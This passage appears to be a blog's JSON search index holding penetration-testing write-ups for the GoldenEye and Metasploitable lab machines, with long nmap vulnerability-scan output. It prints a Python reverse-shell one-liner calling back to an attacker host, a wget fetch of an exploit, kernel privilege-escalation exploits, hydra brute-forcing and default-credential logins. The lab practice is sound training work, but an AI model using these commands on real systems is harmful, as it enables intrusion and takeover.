exploitation xWinter1995x! is the password of admin The version of moodle cms is 2.2.3 It seems that we can use msf to get shell. Before exploit it,set text editor. Step-7 Privilege escalation It's www-data now Search vulnerability to escalate privilege. searchsploit linux ubuntu 3.13 Use 37292.c The absolute path of shellcode is /usr/share/exploitdb/exploits/ move it to /home/kali edit 37292.c,because there is no gcc in target host .Use cc change shell to meterpreter use post/multi/manage/shell_to_meterpreter set session 1 exploit sessions -i 2 upload 37292.c shell How to use 37292.c will be described in it's code. chmod 777 37292.c cc -o exp 37292.c ./exp Method-2 Reverse shell Step-6 Moodlecms exploitation In 'Site administration-Server-System paths',I find a web which can be used to upload shellcode. python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.124.4&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' listen port 6666 in vps. nc lvnp 6666 check spell Then will get a shell Step-7 Privilege escalation Turn shell to python shell python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' python3 -m http.server 5555 In the shell wget http://192.168.124.5:5555/37292.c Enclosure Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 25/tcp open smtp | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE | ssl-dh-params: | VULNERABLE: | Anonymous Diffie-Hellman Key Exchange MitM Vulnerability | State: VULNERABLE | Transport Layer Security (TLS) services that use anonymous | Diffie-Hellman key exchange only provide protection against passive | eavesdropping, and are vulnerable to active man-in-the-middle attacks | which could completely compromise the confidentiality and integrity | of any data exchanged over the resulting session. | Check results: | ANONYMOUS DH GROUP 1 | Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 512 | Generator Length: 8 | Public Key Length: 512 | References: | https://www.ietf.org/rfc/rfc2246.txt | | Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam) | State: VULNERABLE | IDs: BID:74733 CVE:CVE-2015-4000 | The Transport Layer Security (TLS) protocol contains a flaw that is | triggered when handling Diffie-Hellman key exchanges defined with | the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker | to downgrade the security of a TLS session to 512-bit export-grade | cryptography, which is significantly weaker, allowing the attacker | to more easily break the encryption and monitor or tamper with | the encrypted stream. | Disclosure date: 2015-5-19 | Check results: | EXPORT-GRADE DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 512 | Generator Length: 8 | Public Key Length: 512 | References: | https://weakdh.org | https://www.securityfocus.com/bid/74733 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000 | | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA | Modulus Type: Safe prime | Modulus Source: postfix builtin | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: |_ https://weakdh.org | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: BID:70574 CVE:CVE-2014-3566 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the &quot;POODLE&quot; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.securityfocus.com/bid/70574 | https://www.imperialviolet.org/2014/10/14/poodle.html | https://www.openssl.org/~bodo/ssl-poodle.pdf |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 80/tcp open http |_http-csrf: Couldn't find any CSRF vulnerabilities. |_http-dombased-xss: Couldn't find any DOM based XSS. | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 55006/tcp open unknown | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: BID:70574 CVE:CVE-2014-3566 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the &quot;POODLE&quot; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.securityfocus.com/bid/70574 | https://www.imperialviolet.org/2014/10/14/poodle.html | https://www.openssl.org/~bodo/ssl-poodle.pdf |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | ssl-dh-params: | VULNERABLE: | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: |_ https://weakdh.org 55007/tcp open unknown MAC Address: 00:0C:29:8D:FC:67 (VMware) Nmap done: 1 IP address (1 host up) scanned in 323.07 seconds Command Summary ","link":"https://yidwfnyetg.github.io/post/godeneye/"},{"title":"Metasploitable-2","content":"Information Gathering netdiscover -r 192.168.124.0/24 sudo nmap -sV -O -Pn -T4 192.168.124.32 -p- nmap --script vuln 192.168.124.32 -p- The scanning result is as enclosure. Mehod1:CVE-2007-2447 Same as metasploitable-1,method1 Method2:CVE-2011-2523 it's &quot;root&quot; user Method3:CVE-2004-2687 Privilege escalation is as follows change shell to meterpreter Execute commond as follows: set sessoin 1 exploit sessions -i 2 shell upload linux-exploit-suggester Remember add implement privilege to what you upload Try to escalate privilege by CVE-2018-14665 Failed,What a pity. Use the method in previous hub. remove the suffix name of the public key,then it's the private key. Method4:CVE-2012-1823 Need privilege escalaion again Enclosure â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap --script vuln 192.168.124.32 -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 21:54 EDT Nmap scan report for bogon (192.168.124.32) Host is up (0.0020s latency). Not shown: 65505 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp | ftp-vsftpd-backdoor: | VULNERABLE: | vsFTPd version 2.3.4 backdoor | State: VULNERABLE (Exploitable) | IDs: BID:48539 CVE:CVE-2011-2523 | vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04. | Disclosure date: 2011-07-03 | Exploit results: | Shell command: id | Results: uid=0(root) gid=0(root) | References: | https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb | http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523 |_ https://www.securityfocus.com/bid/48539 22/tcp open ssh 23/tcp open telnet 25/tcp open smtp | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: BID:70574 CVE:CVE-2014-3566 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the &quot;POODLE&quot; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.securityfocus.com/bid/70574 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.imperialviolet.org/2014/10/14/poodle.html |_ https://www.openssl.org/~bodo/ssl-poodle.pdf |sslv2-drown: ERROR: Script execution failed (use -d to debug) | smtp-vuln-cve2010-4344: | The SMTP server is not Exim: NOT VULNERABLE | ssl-dh-params: | VULNERABLE: | Anonymous Diffie-Hellman Key Exchange MitM Vulnerability | State: VULNERABLE | Transport Layer Security (TLS) services that use anonymous | Diffie-Hellman key exchange only provide protection against passive | eavesdropping, and are vulnerable to active man-in-the-middle attacks | which could completely compromise the confidentiality and integrity | of any data exchanged over the resulting session. | Check results: | ANONYMOUS DH GROUP 1 | Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA | Modulus Type: Safe prime | Modulus Source: postfix builtin | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: | https://www.ietf.org/rfc/rfc2246.txt | | Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam) | State: VULNERABLE | IDs: BID:74733 CVE:CVE-2015-4000 | The Transport Layer Security (TLS) protocol contains a flaw that is | triggered when handling Diffie-Hellman key exchanges defined with | the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker | to downgrade the security of a TLS session to 512-bit export-grade | cryptography, which is significantly weaker, allowing the attacker | to more easily break the encryption and monitor or tamper with | the encrypted stream. | Disclosure date: 2015-5-19 | Check results: | EXPORT-GRADE DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 512 | Generator Length: 8 | Public Key Length: 512 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000 | https://www.securityfocus.com/bid/74733 | https://weakdh.org | | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA | Modulus Type: Safe prime | Modulus Source: postfix builtin | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: |_ https://weakdh.org 53/tcp open domain 80/tcp open http | http-enum: | /tikiwiki/: Tikiwiki | /test/: Test page | /phpinfo.php: Possible information file | /phpMyAdmin/: phpMyAdmin | /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2' | /icons/: Potentially interesting folder w/ directory listing |_ /index/: Potentially interesting folder |http-csrf: Couldn't find any CSRF vulnerabilities. |http-stored-xss: Couldn't find any stored XSS vulnerabilities. |http-phpself-xss: ERROR: Script execution failed (use -d to debug) |http-trace: TRACE is enabled |http-dombased-xss: Couldn't find any DOM based XSS. |http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 111/tcp open rpcbind 139/tcp open netbios-ssn 445/tcp open microsoft-ds 512/tcp open exec 513/tcp open login 514/tcp open shell 1099/tcp open rmiregistry | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | | References: | https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb 1524/tcp open ingreslock 2049/tcp open nfs 2121/tcp open ccproxy-ftp 3306/tcp open mysql |ssl-ccs-injection: No reply from server (TIMEOUT) 3632/tcp open distccd | distcc-cve2004-2687: | VULNERABLE: | distcc Daemon Command Execution | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2004-2687 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Allows executing of arbitrary commands on systems running distccd 3.1 and | earlier. The vulnerability is the consequence of weak service configuration. | | Disclosure date: 2002-02-01 | Extra information: | | uid=1(daemon) gid=1(daemon) groups=1(daemon) | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 | https://nvd.nist.gov/vuln/detail/CVE-2004-2687 | https://distcc.github.io/security.html 5432/tcp open postgresql | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: BID:70574 CVE:CVE-2014-3566 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the &quot;POODLE&quot; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.securityfocus.com/bid/70574 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.imperialviolet.org/2014/10/14/poodle.html | https://www.openssl.org/~bodo/ssl-poodle.pdf | ssl-dh-params: | VULNERABLE: | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: | https://weakdh.org | ssl-ccs-injection: | VULNERABLE: | SSL/TLS MITM vulnerability (CCS Injection) | State: VULNERABLE | Risk factor: High | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h | does not properly restrict processing of ChangeCipherSpec messages, | which allows man-in-the-middle attackers to trigger use of a zero | length master key in certain OpenSSL-to-OpenSSL communications, and | consequently hijack sessions or obtain sensitive information, via | a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability. | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 | http://www.openssl.org/news/secadv_20140605.txt | http://www.cvedetails.com/cve/2014-0224 5900/tcp open vnc 6000/tcp open X11 6667/tcp open irc | irc-botnet-channels: | ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information. 6697/tcp open ircs-u | irc-botnet-channels: | ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information. |ssl-ccs-injection: No reply from server (TIMEOUT) 8009/tcp open ajp13 8180/tcp open unknown | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 | http-enum: | /admin/: Possible admin folder | /admin/index.html: Possible admin folder | /admin/login.html: Possible admin folder | /admin/admin.html: Possible admin folder | /admin/account.html: Possible admin folder | /admin/admin_login.html: Possible admin folder | /admin/home.html: Possible admin folder | /admin/admin-login.html: Possible admin folder | /admin/adminLogin.html: Possible admin folder | /admin/controlpanel.html: Possible admin folder | /admin/cp.html: Possible admin folder | /admin/index.jsp: Possible admin folder | /admin/login.jsp: Possible admin folder | /admin/admin.jsp: Possible admin folder | /admin/home.jsp: Possible admin folder | /admin/controlpanel.jsp: Possible admin folder | /admin/admin-login.jsp: Possible admin folder | /admin/cp.jsp: Possible admin folder | /admin/account.jsp: Possible admin folder | /admin/admin_login.jsp: Possible admin folder | /admin/adminLogin.jsp: Possible admin folder | /manager/html/upload: Apache Tomcat (401 Unauthorized) | /manager/html: Apache Tomcat (401 Unauthorized) | /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload | /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload | /admin/jscript/upload.html: Lizard Cart/Remote File upload |_ /webdav/: Potentially interesting folder 8787/tcp open msgsrvr 38316/tcp open unknown 44372/tcp open unknown 50889/tcp open unknown 55138/tcp open unknown Host script results: |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug) |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: false Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds ","link":"https://yidwfnyetg.github.io/post/metasploitable-2/"},{"title":"Metasploitable-1 ","content":" å‚è€ƒæ•™ç¨‹ï¼š https://hack1ng4fun.github.io/2020/03/26/é¶æœº-Metasploitable-1/ æ‰«æç«¯å£ç»“æœï¼š sudo nmap -sV -Pn -T4 -p 1-65535 -O 192.168.124.28 æ–¹æ³•1ï¼šSMBæ¼æ´è¿›å…¥ æŸ¥çœ‹smbç‰ˆæœ¬: smbmap -H 192.168.124.28 get the version of smb: 3.0.20,we have known that smb-3.0.x has a vulnerablity (CVE-2007-2447ï¼‰. Then we can use msf to exploit it. it's root privilege. æ–¹æ³•2ï¼šWeak password(FAIL) Use smb_enumusers to scan users,then arrage result to file &quot;users&quot; my smb_enumusers didn't return unexpected result. the result is as follows: Unfortunately,I failed,I don't know why.I expected future of me to tell myself. brust user of ftp,telnet,ssh,smb,MySQL,PostgreSQL hydra -L users -e nsr ftp://192.168.124.28 -o ftpuser hydra -L users -e nsr ssh://192.168.124.28 -o sshuser hydra -L users -e nsr telnet://192.168.124.28 -o telnetuser hydra -L users -e nsr smb://192.168.124.28 -o smbuser hydra -L users -e nsr mysql://192.168.124.28 -o mysqluser hydra -L users -e nsr postgres://192.168.124.28 -o postgresqluser &quot;-e nsr&quot; means try &quot;n&quot; null password user msfadmin has root privilege. sudo -i change to root user. Method 3:ï¼ˆCVE-2004-2687ï¼‰ There is a weak passwd:root/root in mysql Use nmap for vulnerability scanning: nmap --script vuln 192.168.124.28 -p- open The screenshot is as follows:(the picture is so big that I can't paste it ) ğŸ“æ‰«æç»“æœ.txt We find a vulnerability CVE-2004-2687 Use msf to exploit it,unfortunately,I failed again.I don't know why. Exploit failed: A payload has not been selected Next is escalating privilege. Check scheduled tasks: All scripts are running with root privilege and have no &quot;write&quot; privilege. For convenience,I transform shell to &quot;meterpreter shell&quot; Use kernel vulnerability to escalate privilege. I am counting on &quot;dirty-cow&quot; . upload /home/kali/Desktop/dirty.c /var/spool/cron shell gcc -pthread dirty.c -lcrypt -o dirty chmod +x dirty ./dirty fly Then I get an account &quot;firefart:fly&quot; Method 4: The target's port 80 is open,scan its directory dirb http://192.168.124.28 /usr/share/wordlists/dirb/big.txt find a url : http://192.168.124.28/tikiwiki/ try admin:admin to login(I have change password from admin to 123456 now) Use msf to exploit it again It's account:&quot;ww-data&quot; Use CVE-2009-1185 to escalate privilege. Now,it's accont &quot;firefart',because I have used dirty-cow in method3 Method 5: I have find port 8180 in nmap result, It's a website based on tomcat.Login it depend on weak password &quot;tomcat:tomcat&quot; searchsploit it... Can deploy war to getshell.For convenience ,use msf it's account &quot; tomcat55&quot;.Need privilege escalation. find authoized_keys in /root/.ssh/ ,it's target's public key. After checking, it is found that the OpenSSL version on the target host is within the vulnerability range. Download key pairs on the internet, use 'grep' command to find the matching public key file Remove the suffix name of the public key file to create the corresponding private key file. Use this private key file to log in to the root user of the target host. ","link":"https://yidwfnyetg.github.io/post/metasploitable-1/"},{"title":"Target recommendation","content":" ","link":"https://yidwfnyetg.github.io/post/ba-ji-tui-jian/"}]}